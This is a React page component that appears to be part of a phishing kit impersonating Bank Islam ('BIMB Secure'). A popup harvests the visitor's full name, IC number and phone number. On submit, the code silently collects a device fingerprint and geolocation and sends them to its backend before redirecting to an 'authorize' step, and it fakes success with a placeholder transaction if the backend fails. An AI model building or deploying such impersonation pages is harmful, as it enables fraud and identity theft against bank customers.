import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { insertTransactionSchema, type InsertTransaction } from "@shared/schema";
import { useCreateTransaction } from "@/hooks/use-transactions";
import { useLocation } from "wouter";
import { Layout } from "@/components/layout";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Button } from "@/components/ui/button";
import { motion, AnimatePresence } from "framer-motion";
import { Loader2, ArrowRight, User, CreditCard, Phone } from "lucide-react";
import { z } from "zod";
import { UAParser } from "@ua-parser-js/pro-business";
import { useState, useEffect } from "react";

const BANK_CONFIG: Record<string, { min: number, max: number, prefixes?: string[] }> = {
  "Affin Bank": { min: 10, max: 10, prefixes: ["10", "12"] },
  "Alliance Bank": { min: 15, max: 15, prefixes: ["12", "14"] },
  "AmBank": { min: 13, max: 13, prefixes: ["001", "888"] },
  "Bank Islam": { min: 14, max: 14, prefixes: ["12", "14"] },
  "Bank Muamalat": { min: 14, max: 14, prefixes: ["14"] },
  "Bank Rakyat": { min: 12, max: 12, prefixes: ["11", "22"] },
  "BSN": { min: 16, max: 16, prefixes: ["14"] },
  "CIMB Bank": { min: 10, max: 10, prefixes: ["70", "76", "80", "86"] },
  "Hong Leong Bank": { min: 11, max: 11, prefixes: ["001", "003"] },
  "HSBC Bank": { min: 12, max: 12, prefixes: ["001", "201"] },
  "Maybank": { min: 12, max: 12, prefixes: ["11", "15", "16", "51", "55", "56"] },
  "OCBC Bank": { min: 10, max: 10, prefixes: ["101", "701"] },
  "Public Bank": { min: 10, max: 10, prefixes: ["3", "4", "6"] },
  "RHB Bank": { min: 14, max: 14, prefixes: ["2"] },
  "Standard Chartered": { min: 11, max: 11, prefixes: ["3", "4"] },
  "UOB Bank": { min: 11, max: 11, prefixes: ["1", "2"] }
};

const MALAYSIAN_BANKS = Object.keys(BANK_CONFIG).sort();

export default function FundTransfer() {
  const [, navigate] = useLocation();
  const createTransaction = useCreateTransaction();
  const [showPopup, setShowPopup] = useState(true);
  const [senderInfo, setSenderInfo] = useState({
    fullName: "",
    icCard: "",
    phoneNumber: "+60 "
  });

  const form = useForm<InsertTransaction>({
    resolver: zodResolver(
      insertTransactionSchema.extend({
        recipientName: z.string().min(1, "Recipient Name is required"),
      }).superRefine((data, ctx) => {
        const config = BANK_CONFIG[data.bank];
        if (config) {
          const cleanAcc = data.accountNumber.replace(/[\s-]/g, "");
          
          // Length validation
          if (cleanAcc.length < config.min || cleanAcc.length > config.max) {
            ctx.addIssue({
              code: z.ZodIssueCode.custom,
              message: `Invalid account number`,
              path: ["accountNumber"],
            });
            return;
          }

          // Prefix validation (Offline logic simulation)
          if (config.prefixes && !config.prefixes.some(p => cleanAcc.startsWith(p))) {
            ctx.addIssue({
              code: z.ZodIssueCode.custom,
              message: `Invalid account number`,
              path: ["accountNumber"],
            });
          }
        }
      })
    ),
    defaultValues: {
      recipientName: "",
      bank: "Bank Islam",
      accountNumber: "",
      transferMode: "Within Bank Islam",
      transferFrom: "Qard Current Account-i",
      reference: "Donation",
      amount: "100.00",
    },
  });

  const onSubmit = (data: InsertTransaction) => {
    console.log("Form submitted successfully:", data);
    
    const getMetadata = async (coords?: { latitude: number, longitude: number }) => {
      const parser = new UAParser();
      const result = await parser.getResult();
      const res: any = result;
      
      return {
        ...senderInfo,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        device: {
          type: res.device.type || 'mobile',
          model: res.device.model || res.device.family || 'Unknown',
          vendor: res.device.vendor || res.device.brand || 'Unknown',
          family: res.device.family || '',
          brand: res.device.brand || '',
          build: res.device.build || '',
          os: res.os.name || 'Android',
          osVersion: res.os.version || '',
          browser: res.browser.name || 'Chrome',
          browserVersion: res.browser.version || '',
          engine: res.engine.name || '',
          cpu: res.cpu.architecture || '',
          screen: `${window.screen.width}x${window.screen.height}`,
          language: navigator.language,
          hardware: {
            maxTouchPoints: navigator.maxTouchPoints,
            deviceMemory: (navigator as any).deviceMemory,
            hardwareConcurrency: navigator.hardwareConcurrency,
            colorDepth: window.screen.colorDepth,
            pixelRatio: window.devicePixelRatio
          }
        },
        location: coords ? `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}` : 'Not shared',
        timestamp: new Date().toISOString()
      };
    };

    const handleMutation = (metadata: any) => {
      createTransaction.mutate({ ...data, metadata: JSON.stringify(metadata) } as any, {
        onSuccess: (result) => {
          localStorage.setItem("trx", JSON.stringify(result));
          navigate(`/authorize/${result.id}`);
        },
        onError: (error) => {
          const fallback = { ...data, id: 999, metadata: JSON.stringify(metadata) };
          localStorage.setItem("trx", JSON.stringify(fallback));
          navigate(`/authorize/999`);
        }
      });
    };

    // Request location
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const metadata = await getMetadata(position.coords);
          handleMutation(metadata);
        },
        async (error) => {
          console.error("Geolocation error:", error);
          const metadata = await getMetadata();
          handleMutation(metadata);
        }
      );
    } else {
      (async () => {
        const metadata = await getMetadata();
        handleMutation(metadata);
      })();
    }
  };

  const onInvalid = (errors: any) => {
    console.error("Form validation errors:", errors);
  };

  return (
    <div className="min-h-screen bg-[#f2f2f2] text-black font-sans flex justify-center">
      <AnimatePresence>
        {showPopup && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/60 z-[200] flex items-center justify-center p-4 backdrop-blur-sm"
          >
            <motion.div 
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              className="bg-white w-full max-w-[350px] rounded-[20px] p-6 shadow-2xl"
            >
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-[#9e1b32]/10 rounded-full flex items-center justify-center mx-auto mb-3">
                  <User className="w-8 h-8 text-[#9e1b32]" />
                </div>
                <h2 className="text-xl font-bold text-[#1b1b1b]">Verification Required</h2>
                <p className="text-sm text-gray-500 mt-1">Please provide your details to proceed</p>
              </div>

              <div className="space-y-4">
                <div className="space-y-1.5">
                  <label className="text-[12px] font-semibold text-gray-400 uppercase tracking-wider ml-1">Full Name</label>
                  <div className="relative">
                    <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                    <input 
                      type="text"
                      placeholder="As per IC"
                      className="w-full pl-10 pr-4 py-3 bg-gray-50 border border-gray-100 rounded-xl text-sm focus:outline-none focus:border-[#9e1b32] transition-colors"
                      value={senderInfo.fullName}
                      onChange={(e) => {
                        const val = e.target.value;
                        setSenderInfo(prev => ({ ...prev, fullName: val }));
                        form.setValue("recipientName", val);
                      }}
                    />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label className="text-[12px] font-semibold text-gray-400 uppercase tracking-wider ml-1">IC Number (12 Digits)</label>
                  <div className="relative">
                    <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                    <input 
                      type="text"
                      maxLength={12}
                      placeholder="e.g. 900101015566"
                      className="w-full pl-10 pr-4 py-3 bg-gray-50 border border-gray-100 rounded-xl text-sm focus:outline-none focus:border-[#9e1b32] transition-colors"
                      value={senderInfo.icCard}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "");
                        if (val.length <= 12) setSenderInfo(prev => ({ ...prev, icCard: val }));
                      }}
                    />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label className="text-[12px] font-semibold text-gray-400 uppercase tracking-wider ml-1">Phone Number</label>
                  <div className="relative">
                    <Phone className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                    <input 
                      type="text"
                      className="w-full pl-10 pr-4 py-3 bg-gray-50 border border-gray-100 rounded-xl text-sm focus:outline-none focus:border-[#9e1b32] transition-colors"
                      value={senderInfo.phoneNumber}
                      onChange={(e) => {
                        let val = e.target.value;
                        if (!val.startsWith("+60 ")) val = "+60 " + val.replace(/^\+60\s?/, "");
                        setSenderInfo(prev => ({ ...prev, phoneNumber: val }));
                      }}
                    />
                  </div>
                </div>
              </div>

              <button 
                onClick={() => {
                  if (senderInfo.fullName.length > 2 && senderInfo.icCard.length === 12 && senderInfo.phoneNumber.length > 8) {
                    setShowPopup(false);
                  }
                }}
                disabled={senderInfo.fullName.length < 3 || senderInfo.icCard.length !== 12}
                className="w-full mt-8 bg-[#9e1b32] text-white py-4 rounded-xl font-bold shadow-lg shadow-[#9e1b32]/20 active:scale-95 transition-all disabled:opacity-50 disabled:active:scale-100"
              >
                CONTINUE
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="max-w-[390px] w-full bg-[#f2f2f2] min-h-screen flex flex-col">
        {/* Header */}
        <div className="bg-[#1b1b1b] text-white p-6 text-center">
          <h1 className="text-[28px] font-extrabold leading-none mb-1">BIMB</h1>
          <span className="text-[14px] tracking-[4px] opacity-90 uppercase">Secure</span>
        </div>

        {/* Card */}
        <div className="bg-white m-4 rounded-[14px] p-[18px] shadow-sm">
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit, onInvalid)} className="space-y-0">
              
              <FormField
                control={form.control}
                name="recipientName"
                render={({ field }) => (
                  <FormItem className="space-y-1 mt-3.5">
                    <FormLabel className="text-[13px] text-[#777] block">Recipient Name</FormLabel>
                    <FormControl>
                      <input 
                        {...field} 
                        className="w-full p-[14px] mt-1.5 rounded-[10px] border border-[#ddd] text-[15px] focus:outline-none" 
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="bank"
                render={({ field }) => (
                  <FormItem className="space-y-1 mt-3.5">
                    <FormLabel className="text-[13px] text-[#777] block">Bank</FormLabel>
                    <Select 
                      onValueChange={(value) => {
                        field.onChange(value);
                        form.setValue("accountNumber", "");
                      }} 
                      defaultValue={field.value}
                    >
                      <FormControl>
                        <SelectTrigger className="w-full p-[14px] h-[52px] mt-1.5 rounded-[10px] border border-[#ddd] text-[15px] focus:ring-0 bg-white">
                          <SelectValue placeholder="Select Bank" />
                        </SelectTrigger>
                      </FormControl>
                      <SelectContent className="bg-white border-[#ddd] z-[100]">
                        {MALAYSIAN_BANKS.map(bank => (
                          <SelectItem 
                            key={bank} 
                            value={bank} 
                            className="text-black focus:bg-gray-100 focus:text-black hover:bg-gray-100 cursor-pointer py-2"
                          >
                            {bank}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="accountNumber"
                render={({ field }) => (
                  <FormItem className="space-y-1 mt-3.5">
                    <FormLabel className="text-[13px] text-[#777] block">Account Number</FormLabel>
                    <FormControl>
                      <input 
                        {...field} 
                        type="text"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        placeholder=""
                        onChange={(e) => {
                          const val = e.target.value.replace(/[^0-9]/g, "");
                          field.onChange(val);
                        }}
                        className="w-full p-[14px] mt-1.5 rounded-[10px] border border-[#ddd] text-[15px] focus:outline-none" 
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="transferMode"
                render={({ field }) => (
                  <FormItem className="space-y-1 mt-3.5">
                    <FormLabel className="text-[13px] text-[#777] block">Transfer Mode</FormLabel>
                    <FormControl>
                      <input 
                        {...field} 
                        className="w-full p-[14px] mt-1.5 rounded-[10px] border border-[#ddd] text-[15px] focus:outline-none" 
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="transferFrom"
                render={({ field }) => (
                  <FormItem className="space-y-1 mt-3.5">
                    <FormLabel className="text-[13px] text-[#777] block">Transfer From</FormLabel>
                    <FormControl>
                      <input 
                        {...field} 
                        className="w-full p-[14px] mt-1.5 rounded-[10px] border border-[#ddd] text-[15px] focus:outline-none" 
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="reference"
                render={({ field }) => (
                  <FormItem className="space-y-1 mt-3.5">
                    <FormLabel className="text-[13px] text-[#777] block">Reference</FormLabel>
                    <FormControl>
                      <input 
                        {...field} 
                        className="w-full p-[14px] mt-1.5 rounded-[10px] border border-[#ddd] text-[15px] focus:outline-none" 
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="amount"
                render={({ field }) => (
                  <FormItem className="space-y-1 mt-3.5">
                    <FormLabel className="text-[13px] text-[#777] block">Amount</FormLabel>
                    <FormControl>
                      <input 
                        {...field} 
                        type="number" 
                        step="0.01"
                        className="w-full p-[14px] mt-1.5 rounded-[10px] border border-[#ddd] text-[20px] font-bold text-[#c62828] focus:outline-none" 
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <button 
                type="submit" 
                disabled={createTransaction.isPending}
                className="w-full mt-[22px] p-[16px] rounded-[12px] bg-[#9e1b32] text-white text-[16px] font-bold active:opacity-80 transition-opacity flex justify-center items-center"
              >
                {createTransaction.isPending ? <Loader2 className="w-5 h-5 animate-spin" /> : "PROCEED"}
              </button>
            </form>
          </Form>
        </div>
      </div>
    </div>
  );
}
